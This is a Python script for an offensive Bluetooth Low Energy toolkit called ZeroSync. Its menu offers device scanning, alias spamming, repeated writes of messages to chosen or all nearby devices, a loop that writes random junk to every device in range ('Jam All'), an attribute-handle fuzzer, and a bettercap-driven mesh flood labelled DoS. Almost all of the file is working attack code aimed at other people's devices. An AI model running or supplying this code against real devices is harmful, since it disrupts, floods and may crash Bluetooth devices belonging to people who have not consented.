
#!/usr/bin/env python3
import os
import sys
import time
import random
import subprocess
from threading import Thread
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, BTLEException, ADDR_TYPE_RANDOM, ADDR_TYPE_PUBLIC
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box

console = Console()

class BLESpam(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)
    def handleNotification(self, cHandle, data):
        console.print(f"[bold blue]🔔 Notification from device:[/bold blue] {data}")

def section(title):
    console.print(Panel(title, border_style="magenta", title="ZeroSync v5.0", subtitle="by Null_Lyfe"))

def scan_devices():
    section("Scanning for BLE Devices...")
    scanner = Scanner()
    try:
        devices = scanner.scan(10.0)
        if not devices:
            console.print("[red]⚠️ No BLE devices found.[/red]")
            return []
        table = Table(title="Discovered Devices", box=box.SIMPLE_HEAVY)
        table.add_column("Index", style="cyan")
        table.add_column("MAC")
        table.add_column("RSSI", justify="right")
        for i, dev in enumerate(devices):
            table.add_row(str(i), dev.addr, f"{dev.rssi} dB")
        console.print(table)
        return devices
    except BTLEException as e:
        console.print(f"[red]❌ BLE scan failed: {e}[/red]")
        return []

def advertise_all():
    section("Broadcasting BLE Aliases")
    names = ["ZeroSync_X", "BLE_Mesh_1337", "Null_Van", "💀DeadZone", "👾PingTrap"]
    subprocess.run(["bluetoothctl", "power", "on"], stdout=subprocess.DEVNULL)
    subprocess.run(["bluetoothctl", "discoverable", "on"], stdout=subprocess.DEVNULL)
    subprocess.run(["bluetoothctl", "pairable", "on"], stdout=subprocess.DEVNULL)
    subprocess.run(["bluetoothctl", "agent", "NoInputNoOutput"], stdout=subprocess.DEVNULL)
    try:
        while True:
            for name in names:
                subprocess.run(["bluetoothctl", "system-alias", name], stdout=subprocess.DEVNULL)
                console.print(f"[bold cyan]📡 Advertising:[/bold cyan] {name}")
                time.sleep(1.5)
    except KeyboardInterrupt:
        subprocess.run(["bluetoothctl", "system-alias", "ZeroSync"], stdout=subprocess.DEVNULL)
        console.print("[red]🛑 Stopped advertising[/red]")

def spam_device():
    devices = scan_devices()
    if not devices:
        return
    try:
        idx = int(input("💬 Index to spam: "))
        msg = input("💬 Message: ").encode()
        addr = devices[idx].addr
        p = Peripheral(addr, ADDR_TYPE_RANDOM)
        p.setDelegate(BLESpam())
        while True:
            p.writeCharacteristic(0x0001, msg)
            console.print(f"[green]💌 Sent:[/green] {msg.decode()}")
            time.sleep(1)
    except Exception as e:
        console.print(f"[red]❌ Error: {e}[/red]")

def spam_all():
    devices = scan_devices()
    if not devices:
        return
    msg = input("💬 Broadcast Message: ").encode()
    for d in devices:
        try:
            p = Peripheral(d.addr, ADDR_TYPE_RANDOM)
            p.writeCharacteristic(0x0001, msg)
            console.print(f"[cyan]💥 Sent to:[/cyan] {d.addr}")
            p.disconnect()
        except Exception:
            continue

def jam_all():
    try:
        rssi_limit = int(input("📶 RSSI Threshold (e.g. -80): "))
    except:
        rssi_limit = -80
    while True:
        try:
            scanner = Scanner()
            devices = scanner.scan(8.0)
            for d in devices:
                if d.rssi >= rssi_limit:
                    try:
                        p = Peripheral(d.addr)
                        junk = os.urandom(random.randint(20, 40))
                        p.writeCharacteristic(0x000b, junk, withResponse=False)
                        console.print(f"[red]🚫 Jammed:[/red] {d.addr}")
                        p.disconnect()
                    except Exception:
                        pass
        except Exception:
            continue

def ble_fuzzer():
    devices = scan_devices()
    if not devices:
        return
    try:
        idx = int(input("🔧 Fuzz index: "))
        addr = devices[idx].addr
        p = Peripheral(addr, ADDR_TYPE_RANDOM)
        while True:
            handle = random.randint(0x0001, 0x0020)
            fuzz = os.urandom(random.randint(8, 30))
            p.writeCharacteristic(handle, fuzz)
            console.print(f"[bold]🧬 Fuzzed {addr} @ {hex(handle)}[/bold]")
            time.sleep(0.3)
    except Exception as e:
        console.print(f"[red]❌ Error: {e}[/red]")

# === BLE Mesh Attacks ===
def mesh_discover():
    section("🌐 BLE Mesh Discovery")
    os.system("bettercap -eval 'ble.recon on; sleep 5; ble.show'")

def mesh_map():
    section("🌐 BLE Mesh Topology Mapping")
    os.system("bettercap -eval 'ble.recon on; sleep 10; ble.show'")

def mesh_flood():
    section("🧨 BLE Mesh Flood (DoS)")
    os.system("bettercap -eval 'ble.recon on; ble.fuzz on'")

def bettercap_bridge():
    section("🔌 Interactive Bettercap Console")
    os.system("bettercap")

def menu():
    while True:
        table = Table(title="ZeroSync v5.0", box=box.ROUNDED, style="bold magenta")
        table.add_column("Option", justify="center", style="cyan", no_wrap=True)
        table.add_column("Action", justify="left", style="white")
        table.add_row("1", "Scan for BLE Devices")
        table.add_row("2", "Broadcast BLE Aliases (Spam Jam)")
        table.add_row("3", "Spam Single BLE Device")
        table.add_row("4", "Spam All BLE Devices")
        table.add_row("5", "Jam All BLE Devices")
        table.add_row("6", "Attribute Fuzzer")
        table.add_row("7", "Mesh Discovery 🌐")
        table.add_row("8", "Mesh Topology Mapping")
        table.add_row("9", "Mesh Flood / DoS")
        table.add_row("10", "Open Bettercap Console")
        table.add_row("0", "Exit")
        console.print(table)
        opt = input("🔮 Select: ").strip()
        if opt == "1": scan_devices()
        elif opt == "2": advertise_all()
        elif opt == "3": spam_device()
        elif opt == "4": spam_all()
        elif opt == "5": jam_all()
        elif opt == "6": ble_fuzzer()
        elif opt == "7": mesh_discover()
        elif opt == "8": mesh_map()
        elif opt == "9": mesh_flood()
        elif opt == "10": bettercap_bridge()
        elif opt == "0":
            console.print("[bold red]Exiting...[/bold red]")
            break
        else:
            console.print("[red]Invalid choice[/red]")

if __name__ == "__main__":
    section("ZeroSync BLE Mesh Toolkit v5.0")
    menu()
